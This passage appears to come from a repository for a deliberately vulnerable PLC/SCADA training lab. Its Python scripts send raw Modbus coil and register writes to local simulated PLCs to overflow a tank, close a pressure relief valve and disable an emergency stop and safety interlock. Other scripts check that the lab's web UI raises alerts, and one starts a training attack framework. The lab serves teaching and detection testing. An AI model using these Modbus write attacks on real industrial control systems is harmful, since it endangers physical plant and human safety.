    coil_value = 0xFF00 if value else 0x0000
    request = struct.pack('>HHHB', 1, 0, 6, 1) + struct.pack('>BHH', 0x05, coil, coil_value)
    sock.send(request)
    response = sock.recv(1024)
    sock.close()

    return response

def print_header(text):
    """Print a nice header"""
    print("\n" + "="*70)
    print(f"  {text}")
    print("="*70)

def print_state_comparison(before, after, keys):
    """Print before/after comparison"""
    print(f"\n{'State':<30} {'BEFORE':<15} {'AFTER':<15} {'Changed?':<10}")
    print("-" * 70)
    for key in keys:
        before_val = before.get(key, 'N/A')
        after_val = after.get(key, 'N/A')
        changed = "YES <<<" if before_val != after_val else ""
        print(f"{key:<30} {str(before_val):<15} {str(after_val):<15} {changed:<10}")

print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  Vuln-PLC Attack Demonstration                               â•‘
â•‘  Watch Modbus attacks affect the Web UI in real-time!       â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
""")

# Attack 1: Tank Overflow (Turn pump ON, valve CLOSED)
print_header("ATTACK 1: Tank Overflow Attack")
print("Target: PLC-1 (Tank Control) - Port 5502")
print("Attack: Turn pump ON + Close drain valve")

print("\n[*] Reading current state...")
before = read_state()

print("[*] Executing Modbus attacks...")
print("    â””â”€ Writing coil 0 (pump1_status) = ON")
modbus_write_coil('127.0.0.1', 5502, 0, True)
time.sleep(0.2)

print("    â””â”€ Writing coil 3 (valve1_status) = CLOSED")
modbus_write_coil('127.0.0.1', 5502, 3, False)
time.sleep(0.5)

print("[*] Reading new state...")
after = read_state()

print_state_comparison(before, after, ['pump1_status', 'valve1_status', 'tank1_level'])

print("\n[!] IMPACT: Pump is filling tank but drain valve is closed!")
print("    Tank will overflow causing physical damage.")

# Attack 2: Pressure Vessel Rupture
print_header("ATTACK 2: Pressure Vessel Rupture")
print("Target: PLC-2 (Pressure Control) - Port 5503")
print("Attack: Turn compressor ON + Close relief valve")

before2 = read_state()

print("\n[*] Executing Modbus attacks...")
print("    â””â”€ Writing coil 0 (compressor) = ON")
modbus_write_coil('127.0.0.1', 5503, 0, True)
time.sleep(0.2)

print("    â””â”€ Writing coil 4 (relief valve) = CLOSED")
modbus_write_coil('127.0.0.1', 5503, 4, False)
time.sleep(0.5)

after2 = read_state()

print_state_comparison(before2, after2, ['pump1_status', 'valve4_status', 'tank1_pressure'])

print("\n[!] IMPACT: Pressure building with no relief!")
print("    Vessel will rupture causing explosion hazard.")

# Attack 3: Safety System Bypass
print_header("ATTACK 3: Safety System Bypass")
print("Target: PLC-4 (Safety/ESD) - Port 5505")
print("Attack: Disable emergency stop + Disable safety interlock")

before3 = read_state()

print("\n[*] Executing Modbus attacks...")
print("    â””â”€ Writing coil 0 (emergency_stop) = DISABLED")
modbus_write_coil('127.0.0.1', 5505, 0, False)
time.sleep(0.2)

print("    â””â”€ Writing coil 1 (safety_interlock) = DISABLED")
modbus_write_coil('127.0.0.1', 5505, 1, False)
time.sleep(0.5)

after3 = read_state()

print_state_comparison(before3, after3, ['emergency_stop', 'safety_interlock'])

print("\n[!] IMPACT: All safety systems disabled!")
print("    No automatic shutdown in case of emergency.")

# Web UI Instructions
print_header("HOW TO SEE THE EFFECTS IN WEB UI")
print("""
1. Open browser to: http://localhost:5000
2. Login with: admin / admin
3. Navigate to one of these pages:

   ðŸ“Š HMI Page (http://localhost:5000/hmi)
   â”œâ”€ Shows: Tank Level, Pump Status, Valve Status
   â”œâ”€ Real-time gauges and indicators
   â””â”€ Auto-refreshes every 2 seconds

   ðŸŽ›ï¸  Process Page (http://localhost:5000/process)
   â”œâ”€ Shows: All equipment status (pumps, valves, motors)
   â”œâ”€ Control buttons (but attacks bypass web controls!)
   â””â”€ Full state display at bottom

   ðŸ“ˆ SCADA Dashboard (http://localhost:5000/scada)
   â”œâ”€ Overview of all 4 PLCs
   â”œâ”€ Process diagram
   â””â”€ System status

4. Watch the values change in real-time!
   â”œâ”€ Pump status indicators will show ON/OFF
   â”œâ”€ Valve status will show OPEN/CLOSED
   â”œâ”€ Tank levels and pressures will change
   â””â”€ Alarms may trigger for dangerous conditions

WHAT TO LOOK FOR:
âœ“ "Pump 1 Status" should show "true" or "ON" or green indicator
âœ“ "Valve 1 Status" should show "false" or "CLOSED" or red indicator
âœ“ "Emergency Stop" should show "false" or "DISABLED"
âœ“ Check the "full_state" JSON at the bottom of Process page
âœ“ Look for alarm banners at the top (high levels, high pressure)

TIP: Open the browser dev console (F12) and watch the Network tab
     to see the /api/process/status calls every 2 seconds with
     updated values!
""")

print("\n[*] Current full state:")
final_state = read_state()
print(json.dumps(final_state, indent=2, sort_keys=True))

print("\n" + "="*70)
print("  Demo complete! Open the web UI to see the effects.")
print("="*70 + "\n")



================================================================================
FILE: quick_test.py
================================================================================
#!/usr/bin/env python3
"""Quick test to check if Modbus server is responding"""
import socket
import struct
import sys

def test_connection(port=5555):
    """Test if port is accepting connections"""
    print(f"[TEST 1] Checking if port {port} is open...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex(('localhost', port))
        sock.close()

        if result == 0:
            print(f"  âœ“ Port {port} is OPEN and accepting connections")
            return True
        else:
            print(f"  âœ— Port {port} is CLOSED")
            return False
    except Exception as e:
        print(f"  âœ— Error: {e}")
        return False

def test_modbus_read(port=5555):
    """Test reading Modbus holding registers"""
    print("\n[TEST 2] Sending Modbus Read Holding Registers request...")
    try:
        # Connect to Modbus server
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect(('localhost', port))
        print(f"  âœ“ Connected to localhost:{port}")

        # Build Modbus TCP request
        # MBAP Header: Trans ID=1, Proto ID=0, Length=6, Unit ID=1
        # PDU: Function Code 0x03, Start Address=0, Count=5
        transaction_id = 0x0001
        protocol_id = 0x0000
        unit_id = 0x01

        # PDU: Read 5 registers starting at address 0
        pdu = struct.pack('>BHH', 0x03, 0x0000, 5)
        length = len(pdu) + 1  # +1 for unit_id

        # Complete request
        request = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id) + pdu

        print(f"  â†’ Request (hex): {request.hex()}")
        print(f"  â†’ Request breakdown:")
        print(f"     Transaction ID: {transaction_id}")
        print(f"     Protocol ID: {protocol_id}")
        print(f"     Length: {length}")
        print(f"     Unit ID: {unit_id}")
        print(f"     Function Code: 0x03 (Read Holding Registers)")
        print(f"     Start Address: 0")
        print(f"     Count: 5 registers")

        # Send request
        sock.send(request)
        print("  âœ“ Request sent")

        # Read response
        response = sock.recv(1024)
        print(f"  â† Response (hex): {response.hex()}")
        print(f"  â† Response length: {len(response)} bytes")

        if len(response) < 9:
            print("  âœ— Response too short - not valid Modbus")
            sock.close()
            return False

        # Parse response header
        resp_trans_id, resp_proto_id, resp_length, resp_unit_id = struct.unpack('>HHHB', response[:7])
        function_code = response[7]

        print(f"  â† Response breakdown:")
        print(f"     Transaction ID: {resp_trans_id}")
        print(f"     Protocol ID: {resp_proto_id}")
        print(f"     Length: {resp_length}")
        print(f"     Unit ID: {resp_unit_id}")
        print(f"     Function Code: {function_code:#04x}")

        if function_code == 0x03:
            # Valid read response
            byte_count = response[8]
            print(f"     Byte Count: {byte_count}")

            # Parse register values
            values = []
            for i in range(byte_count // 2):
                offset = 9 + (i * 2)
                value = struct.unpack('>H', response[offset:offset+2])[0]
                values.append(value)

            print(f"     Register Values: {values}")
            print(f"     Decoded values:")
            print(f"       Register 0 (tank1_level): {values[0] / 10.0}%")
            print(f"       Register 1 (tank1_temp): {values[1] / 10.0}Â°C")
            print(f"       Register 2 (tank1_pressure): {values[2] / 10.0} kPa")
            print(f"       Register 3 (tank2_level): {values[3] / 10.0}%")
            print(f"       Register 4 (tank2_temp): {values[4] / 10.0}Â°C")

            print("\n  âœ“ SUCCESS! Modbus server is responding correctly!")
            sock.close()
            return True
        else:
            print(f"  âœ— Unexpected function code: {function_code:#04x}")
            sock.close()
            return False

    except socket.timeout:
        print("  âœ— Timeout - server not responding")
        return False
    except Exception as e:
        print(f"  âœ— Error: {e}")
        import traceback
        traceback.print_exc()
        return False

def test_modbus_write(port=5555):
    """Test writing a Modbus register"""
    print("\n[TEST 3] Sending Modbus Write Single Register request...")
    try:
        # Connect to Modbus server
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect(('localhost', port))

        # Build Modbus TCP write request
        transaction_id = 0x0002
        protocol_id = 0x0000
        unit_id = 0x01

        # PDU: Function Code 0x06, Address=0, Value=750 (75.0%)
        pdu = struct.pack('>BHH', 0x06, 0x0000, 750)
        length = len(pdu) + 1

        # Complete request
        request = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id) + pdu

        print(f"  â†’ Request (hex): {request.hex()}")
        print(f"     Function Code: 0x06 (Write Single Register)")
        print(f"     Address: 0 (tank1_level)")
        print(f"     Value: 750 (75.0%)")

        # Send request
        sock.send(request)

        # Read response
        response = sock.recv(1024)
        print(f"  â† Response (hex): {response.hex()}")

        function_code = response[7]
        if function_code == 0x06:
            addr, value = struct.unpack('>HH', response[8:12])
            print(f"     Address echoed: {addr}")
            print(f"     Value echoed: {value}")
            print("\n  âœ“ SUCCESS! Write register works!")
            sock.close()
            return True
        else:
            print(f"  âœ— Unexpected function code: {function_code:#04x}")
            sock.close()
            return False

    except Exception as e:
        print(f"  âœ— Error: {e}")
        return False

if __name__ == '__main__':
    # Allow specifying port as command line argument
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5555

    print("=" * 70)
    print("  MODBUS TCP SERVER TEST")
    print(f"  Testing port: {port}")
    print("=" * 70)

    # Test 1: Connection
    if not test_connection(port):
        print(f"\nâŒ Port {port} is not open. Start the server first:")
        if port == 5555:
            print("   python3 standalone_modbus.py")
        else:
            print("   python3 core/app.py")
        sys.exit(1)

    # Test 2: Read registers
    if not test_modbus_read(port):
        print("\nâŒ Modbus read failed - server might not be implementing the protocol")
        sys.exit(1)

    # Test 3: Write register
    if not test_modbus_write(port):
        print("\nâŒ Modbus write failed")
        sys.exit(1)

    print("\n" + "=" * 70)
    print("  âœ… ALL TESTS PASSED!")
    print("  The Modbus TCP server is working correctly!")
    print("=" * 70)
    print("\nYou can now use real Modbus tools:")
    print(f"  â€¢ modbus-cli: modbus read localhost:{port} 0 10")
    print("  â€¢ pymodbus: See MODBUS_IMPLEMENTATION.md")
    print("  â€¢ Metasploit: SCADA modules will work")



================================================================================
FILE: test_50_attacks.py
================================================================================
#!/usr/bin/env python3
"""
Generate 50 attacks across all 4 PLCs to test filtering system
"""
import socket
import struct
import time
import random

def modbus_attack(port, coil, value, desc):
    """Execute a Modbus write attack"""
    try:
        sock = socket.socket()
        sock.settimeout(2)
        sock.connect(('127.0.0.1', port))

        coil_value = 0xFF00 if value else 0x0000
        request = struct.pack('>HHHB', 1, 0, 6, 1) + struct.pack('>BHH', 0x05, coil, coil_value)
        sock.send(request)
        response = sock.recv(1024)
        sock.close()

        return len(response) >= 12 and response[7] == 0x05
    except Exception as e:
        return False

print('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  Generating 50 Attacks to Test Filtering System             â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
''')

attacks = [
    # PLC-1 attacks (Tank) - Mix of CRITICAL and WARNING
    {'plc': 'PLC-1', 'port': 5502, 'coil': 0, 'value': True, 'desc': 'Pump ON', 'severity': 'CRITICAL'},
    {'plc': 'PLC-1', 'port': 5502, 'coil': 3, 'value': False, 'desc': 'Valve closed', 'severity': 'WARNING'},
    {'plc': 'PLC-1', 'port': 5502, 'coil': 0, 'value': False, 'desc': 'Pump OFF', 'severity': 'CRITICAL'},
    {'plc': 'PLC-1', 'port': 5502, 'coil': 3, 'value': True, 'desc': 'Valve open', 'severity': 'WARNING'},

    # PLC-2 attacks (Pressure) - Mostly CRITICAL
    {'plc': 'PLC-2', 'port': 5503, 'coil': 0, 'value': True, 'desc': 'Compressor ON', 'severity': 'CRITICAL'},
    {'plc': 'PLC-2', 'port': 5503, 'coil': 4, 'value': False, 'desc': 'Relief valve closed', 'severity': 'CRITICAL'},
    {'plc': 'PLC-2', 'port': 5503, 'coil': 0, 'value': False, 'desc': 'Compressor OFF', 'severity': 'CRITICAL'},
    {'plc': 'PLC-2', 'port': 5503, 'coil': 4, 'value': True, 'desc': 'Relief valve open', 'severity': 'CRITICAL'},
    {'plc': 'PLC-2', 'port': 5503, 'coil': 5, 'value': True, 'desc': 'Pressure sensor', 'severity': 'WARNING'},

    # PLC-3 attacks (Temperature) - Mix
    {'plc': 'PLC-3', 'port': 5504, 'coil': 0, 'value': True, 'desc': 'Heater ON', 'severity': 'CRITICAL'},
    {'plc': 'PLC-3', 'port': 5504, 'coil': 2, 'value': False, 'desc': 'Cooler OFF', 'severity': 'CRITICAL'},
    {'plc': 'PLC-3', 'port': 5504, 'coil': 0, 'value': False, 'desc': 'Heater OFF', 'severity': 'CRITICAL'},
    {'plc': 'PLC-3', 'port': 5504, 'coil': 2, 'value': True, 'desc': 'Cooler ON', 'severity': 'CRITICAL'},
    {'plc': 'PLC-3', 'port': 5504, 'coil': 5, 'value': True, 'desc': 'Temp sensor', 'severity': 'WARNING'},

    # PLC-4 attacks (Safety) - ALL CRITICAL
    {'plc': 'PLC-4', 'port': 5505, 'coil': 0, 'value': False, 'desc': 'E-stop disabled', 'severity': 'CRITICAL'},
    {'plc': 'PLC-4', 'port': 5505, 'coil': 1, 'value': False, 'desc': 'Interlock disabled', 'severity': 'CRITICAL'},
    {'plc': 'PLC-4', 'port': 5505, 'coil': 0, 'value': True, 'desc': 'E-stop enabled', 'severity': 'CRITICAL'},
    {'plc': 'PLC-4', 'port': 5505, 'coil': 1, 'value': True, 'desc': 'Interlock enabled', 'severity': 'CRITICAL'},
]

# Repeat attacks to reach 50 total
attack_list = []
for i in range(3):
    attack_list.extend(attacks)

# Add a few more to reach exactly 50
attack_list.extend(attacks[:2])

print(f'Executing {len(attack_list)} attacks across all 4 PLCs...\n')

success_count = 0
plc_counts = {'PLC-1': 0, 'PLC-2': 0, 'PLC-3': 0, 'PLC-4': 0}
severity_counts = {'CRITICAL': 0, 'WARNING': 0}

for i, attack in enumerate(attack_list, 1):
    severity_icon = 'ðŸš¨ðŸš¨' if attack['severity'] == 'CRITICAL' else 'âš ï¸ '
    print(f"[{i}/50] {severity_icon} {attack['plc']}: {attack['desc']}", end=' ')

    success = modbus_attack(attack['port'], attack['coil'], attack['value'], attack['desc'])

    if success:
        print('âœ“')
        success_count += 1
        plc_counts[attack['plc']] += 1
        severity_counts[attack['severity']] += 1
    else:
        print('âœ—')

    # Small delay to avoid overwhelming the system
    time.sleep(0.1)

print('\n' + '='*70)
print('ATTACK SUMMARY:')
print('='*70)
print(f'Total attacks executed: {success_count}/50')
print()
print('Attacks by PLC:')
for plc, count in sorted(plc_counts.items()):
    print(f'  {plc}: {count} attacks')
print()
print('Attacks by Severity:')
for sev, count in sorted(severity_counts.items()):
    icon = 'ðŸš¨' if sev == 'CRITICAL' else 'âš ï¸'
    print(f'  {icon} {sev}: {count} attacks')
print()
print('='*70)
print()

print('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  Testing Alert Filtering                                     â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Open: http://localhost:5000/process (admin/admin)

Now test these filter combinations:

1. Filter by PLC-4 only:
   â†’ Uncheck PLC-1, PLC-2, PLC-3
   â†’ Should show ~16 PLC-4 alerts
   â†’ All should be CRITICAL

2. Filter by CRITICAL only:
   â†’ Uncheck WARNING
   â†’ Should show ~42 CRITICAL alerts

3. Filter by WARNING only:
   â†’ Uncheck CRITICAL
   â†’ Should show ~8 WARNING alerts

4. Filter PLC-1 + WARNING:
   â†’ Check only PLC-1 and WARNING
   â†’ Should show ~4 PLC-1 WARNING alerts

5. Export filtered data:
   â†’ Set filters, click "Export to CSV"
   â†’ Verify CSV contains only filtered alerts

6. Clear filters:
   â†’ Click "Clear Filters"
   â†’ Should show all ~50 alerts

Alert count should update in real-time!
''')



================================================================================
FILE: test_all_plcs.py
================================================================================
#!/usr/bin/env python3
"""
Test visual alerts across ALL 4 PLCs
"""
import socket
import struct
import time
import requests

def modbus_attack(port, coil, value, desc):
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect(('127.0.0.1', port))

        coil_value = 0xFF00 if value else 0x0000
        request = struct.pack('>HHHB', 1, 0, 6, 1) + struct.pack('>BHH', 0x05, coil, coil_value)
        sock.send(request)
        response = sock.recv(1024)
        sock.close()

        return len(response) >= 12 and response[7] == 0x05
    except Exception as e:
        return False

print('''
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  Testing Visual Alerts Across ALL 4 PLCs                    â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
''')

attacks = [
    {'plc': 'PLC-1 (Tank)', 'port': 5502, 'coil': 0, 'value': True, 'desc': 'Turn pump ON', 'severity': 'CRITICAL'},
    {'plc': 'PLC-1 (Tank)', 'port': 5502, 'coil': 3, 'value': False, 'desc': 'Close valve', 'severity': 'WARNING'},

    {'plc': 'PLC-2 (Pressure)', 'port': 5503, 'coil': 0, 'value': True, 'desc': 'Turn compressor ON', 'severity': 'CRITICAL'},
    {'plc': 'PLC-2 (Pressure)', 'port': 5503, 'coil': 4, 'value': False, 'desc': 'Close relief valve', 'severity': 'CRITICAL'},

    {'plc': 'PLC-3 (Temperature)', 'port': 5504, 'coil': 0, 'value': True, 'desc': 'Turn heater ON', 'severity': 'CRITICAL'},
    {'plc': 'PLC-3 (Temperature)', 'port': 5504, 'coil': 2, 'value': False, 'desc': 'Turn cooler OFF', 'severity': 'CRITICAL'},

    {'plc': 'PLC-4 (Safety)', 'port': 5505, 'coil': 0, 'value': False, 'desc': 'Disable emergency stop', 'severity': 'CRITICAL'},
    {'plc': 'PLC-4 (Safety)', 'port': 5505, 'coil': 1, 'value': False, 'desc': 'Disable safety interlock', 'severity': 'CRITICAL'},
]

print('Executing attacks on all 4 PLCs...\n')

for i, attack in enumerate(attacks, 1):
    severity_icon = 'ðŸš¨ðŸš¨' if attack['severity'] == 'CRITICAL' else 'âš ï¸ '
    print(f"[{i}/8] {severity_icon} {attack['plc']}: {attack['desc']}")

    success = modbus_attack(attack['port'], attack['coil'], attack['value'], attack['desc'])

    if success:
        print(f"      âœ“ Attack successful on port {attack['port']}")
    else:
        print(f"      âœ— Attack failed")

    time.sleep(0.3)

print('\nWaiting for alerts to process...')
time.sleep(2)

print('\n' + 'â•'*70)
print('  SECURITY ALERTS FROM ALL 4 PLCs')
print('â•'*70 + '\n')

try:
    r = requests.get('http://127.0.0.1:5000/api/security/alerts', timeout=3)
    data = r.json()

    if data['success'] and data['total'] > 0:
        print(f'Total alerts generated: {data["total"]}\n')

        # Group by PLC
        by_plc = {}
        for alert in data['alerts']:
            plc = alert.get('plc', 'Unknown')
            if plc not in by_plc:
                by_plc[plc] = []
            by_plc[plc].append(alert)

        # Show alerts grouped by PLC
        for plc in sorted(by_plc.keys()):
            print(f'\n{plc} Alerts:')
            print('-' * 70)

            for alert in by_plc[plc][-4:]:  # Last 4 per PLC
                severity_icons = {
                    'CRITICAL': 'ðŸš¨ðŸš¨',
                    'HIGH': 'âš ï¸ ',
                    'WARNING': 'âš ï¸ '
                }
                icon = severity_icons.get(alert['severity'], '  ')

                severity_colors = {
                    'CRITICAL': '\033[91m',  # Red
                    'HIGH': '\033[93m',      # Yellow
                    'WARNING': '\033[93m'    # Yellow
                }
                color = severity_colors.get(alert['severity'], '')
                reset = '\033[0m'

                print(f'{icon} {color}[{alert["timestamp"]}] {alert["severity"]:<10}{reset}')
                print(f'   {alert["message"]}')

        print('\n' + 'â•'*70)
        print('âœ… ALL 4 PLCs ARE DETECTING ATTACKS!')
        print('â•'*70)

    else:
        print('âœ— No alerts generated')

except Exception as e:
    print(f'âœ— Error fetching alerts: {e}')

print('''
\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  Visual Verification in Web UI                              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Open browser: http://localhost:5000/process
Login: admin / admin

You should see:
  â€¢ Red pulsing alert banner for CRITICAL attacks
  â€¢ Orange banner for WARNING attacks
  â€¢ Alert history showing attacks from ALL 4 PLCs
  â€¢ Each alert labeled with which PLC (PLC-1, PLC-2, PLC-3, PLC-4)

Try attacking different PLCs and watch alerts appear:
  python3 attack.py

All 4 PLCs now have visual alert detection! ðŸŽ‰
''')



================================================================================
FILE: test_visual_alerts.py
================================================================================
#!/usr/bin/env python3
"""
Test script to verify visual security alerts are working
"""
import socket
import struct
import time
import requests

print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘         Testing Visual Security Alert System                 â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
""")

def modbus_attack(port, coil, value, description):
    """Execute a Modbus attack"""
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect(('127.0.0.1', port))

        # Write Single Coil
        coil_value = 0xFF00 if value else 0x0000
        request = struct.pack('>HHHB', 1, 0, 6, 1) + struct.pack('>BHH', 0x05, coil, coil_value)
        sock.send(request)
        response = sock.recv(1024)
        sock.close()

        return True
    except Exception as e:
        print(f"âœ— Attack failed: {e}")
        return False

# Test 1: Check if alert API is accessible
print("\n[Test 1] Checking alert API endpoint...")
try:
    response = requests.get('http://127.0.0.1:5000/api/security/alerts', timeout=3)
    if response.status_code == 200:
        data = response.json()
        print(f"âœ“ Alert API is accessible")
        print(f"  Current alerts: {data.get('total', 0)}")
    else:
        print(f"âœ— Alert API returned status {response.status_code}")
except Exception as e:
    print(f"âœ— Cannot access alert API: {e}")
    print("  Make sure containers are running!")
    exit(1)

# Test 2: Execute attacks and check if alerts are generated
print("\n[Test 2] Executing attacks to trigger alerts...")

attacks = [
    {'port': 5502, 'coil': 0, 'value': True, 'desc': 'Turn pump ON'},
    {'port': 5502, 'coil': 3, 'value': False, 'desc': 'Close valve'},
    {'port': 5505, 'coil': 0, 'value': False, 'desc': 'Disable emergency stop (CRITICAL!)'},
]

for i, attack in enumerate(attacks, 1):
    print(f"\n  [{i}/3] {attack['desc']}...")
    success = modbus_attack(attack['port'], attack['coil'], attack['value'], attack['desc'])
    if success:
        print(f"       âœ“ Attack executed")
    time.sleep(1)

# Test 3: Check if alerts were generated
print("\n[Test 3] Checking if alerts were generated...")
time.sleep(2)  # Wait for alerts to be processed

try:
    response = requests.get('http://127.0.0.1:5000/api/security/alerts', timeout=3)
    data = response.json()

    if data['success'] and len(data['alerts']) > 0:
        print(f"âœ“ {len(data['alerts'])} alerts generated!")

        print("\n  Recent alerts:")
        for alert in data['alerts'][-3:]:
            severity_icon = {
                'CRITICAL': 'ðŸš¨ðŸš¨',
                'HIGH': 'âš ï¸ ',
                'WARNING': 'âš ï¸ '
            }.get(alert['severity'], '  ')

            print(f"  {severity_icon} [{alert['timestamp']}] {alert['severity']}: {alert['message']}")

    else:
        print("âœ— No alerts generated")
        print("  This might mean attack detection is not working")

except Exception as e:
    print(f"âœ— Error checking alerts: {e}")

# Test 4: Instructions for visual verification
print("\n" + "="*70)
print("  VISUAL VERIFICATION")
print("="*70)
print("""
1. Open browser to: http://localhost:5000/process
2. Login with: admin / admin
3. You should see:

   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
   â”‚ ðŸš¨ SAFETY SYSTEM TAMPER                                     â”‚
   â”‚ [12:34:56] ðŸš¨ CRITICAL: Safety system tampered!            â”‚
   â”‚ Write to coil 0 from 127.0.0.1                             â”‚
   â”‚                                                        [Ã—]  â”‚
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

   Below the banner, you'll see "Recent Security Events" with a list
   of all detected attacks!

4. The alert banner features:
   - ðŸš¨ Animated icon (bouncing)
   - Red pulsing background for CRITICAL alerts
   - Orange background for WARNING/HIGH alerts
   - Smooth slide-down animation
   - Dismissable with [Ã—] button
   - Alert history showing last 5 events

5. Try running more attacks:
   sudo modbus write-coil 127.0.0.1:5502 0 1

   You'll see a new alert pop up in real-time!

6. To clear alerts:
   POST to http://localhost:5000/api/security/alerts/clear

""")

print("="*70)
print("  Test complete! Check the web UI to see visual alerts.")
print("="*70)



================================================================================
FILE: training_scenarios.py
================================================================================
#!/usr/bin/env python3
"""
Realistic ICS/SCADA Attack Scenarios for Training
Covers various attack types targeting industrial control systems
"""
import socket
import struct
import time
import random
from datetime import datetime

class Color:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class ModbusAttacker:
    """Modbus TCP attack framework for training scenarios"""

    def __init__(self, host='127.0.0.1'):
        self.host = host
        self.ports = {
            'PLC-1': 5502,  # Tank Control
            'PLC-2': 5503,  # Pressure Control
            'PLC-3': 5504,  # Temperature Control
            'PLC-4': 5505   # Safety System
        }

    def write_coil(self, port, coil, value, desc=""):
        """Execute Modbus Write Single Coil (0x05)"""
        try:
            sock = socket.socket()
            sock.settimeout(2)
            sock.connect((self.host, port))

            coil_value = 0xFF00 if value else 0x0000
            request = struct.pack('>HHHB', 1, 0, 6, 1) + struct.pack('>BHH', 0x05, coil, coil_value)

            sock.send(request)
            response = sock.recv(1024)
            sock.close()

            success = len(response) >= 12 and response[7] == 0x05
            return success
        except Exception as e:
            return False

    def write_register(self, port, register, value, desc=""):
        """Execute Modbus Write Single Register (0x06)"""
        try:
            sock = socket.socket()
            sock.settimeout(2)
            sock.connect((self.host, port))

            request = struct.pack('>HHHB', 1, 0, 6, 1) + struct.pack('>BHH', 0x06, register, value)

            sock.send(request)
            response = sock.recv(1024)
            sock.close()

            success = len(response) >= 12 and response[7] == 0x06
            return success
        except Exception as e:
            return False


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# SCENARIO 1: Reconnaissance - System Discovery
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def scenario_reconnaissance():
    """
    SCENARIO: Initial Reconnaissance

    Objective: Discover and profile ICS systems
    Difficulty: Beginner
    Attack Type: Passive/Active Reconnaissance
